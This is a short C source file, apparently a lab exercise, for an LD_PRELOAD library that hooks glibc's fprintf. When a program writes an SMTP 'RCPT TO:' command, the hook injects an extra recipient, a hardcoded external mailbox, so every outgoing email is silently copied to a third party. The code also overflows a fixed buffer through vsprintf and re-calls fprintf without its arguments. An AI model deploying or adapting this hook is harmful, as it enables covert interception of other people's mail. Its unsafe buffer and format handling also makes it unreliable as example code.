#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

/* Function pointers to hold the value of the glibc functions */
static int (*real_fprintf)(FILE *stream, const char *format, ...) = NULL;

int fprintf(FILE *stream, const char *format, ...)
{
    //Sep
    char buffer[255];
    va_list args;

    va_start(args, format);
    vsprintf(buffer, format, args);
    va_end(args);

    real_fprintf = dlsym(RTLD_NEXT, "fprintf");
    
    char RECEPT_TO[] = "RCPT TO:";
    char *result = strstr(buffer, RECEPT_TO);

    if (result != NULL)
    {
        real_fprintf(stream, "RCPT TO: malik.fleury@he-arc.ch\n");
        fflush(stream);

        char receipt[255];
        do
        {
            fgets(receipt, sizeof(receipt), stream);
            //puts(buffer);
        } while (receipt[0] < '2' || receipt[0] > '5');
    }

    return real_fprintf(stream, format);
}
